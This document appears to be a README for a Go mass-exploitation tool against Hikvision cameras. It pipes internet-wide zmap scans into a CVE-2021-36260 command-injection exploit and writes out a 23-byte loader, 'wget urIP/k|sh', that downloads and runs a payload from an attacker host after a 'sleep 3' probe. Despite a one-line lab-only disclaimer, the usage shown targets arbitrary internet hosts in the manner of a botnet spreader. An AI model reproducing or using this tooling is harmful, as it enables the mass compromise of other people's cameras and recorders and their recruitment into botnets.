# hikvision

**CVE-2021-36260** scanner — unauthenticated command injection via `/SDK/webLanguage`. Command field is **23 bytes**; uses short loader `wget urIP/k|sh`.

## File

- `hik.go`

## Usage

```bash
go build -o hik hik.go
zmap -p 80 -o- | ./hik
zmap -p 8080 -o- | ./hik
zmap -p 443 -o- | ./hik
```

## Configuration

- Replace **`urIP`** in `loaderCmd` and probe settings.
- Optional `-debug` flag (see source).

## Verification

Uses `sleep 3` timing probe before full payload (`probeCmd`).

## Disclaimer

Owned NVR/camera lab hardware only.
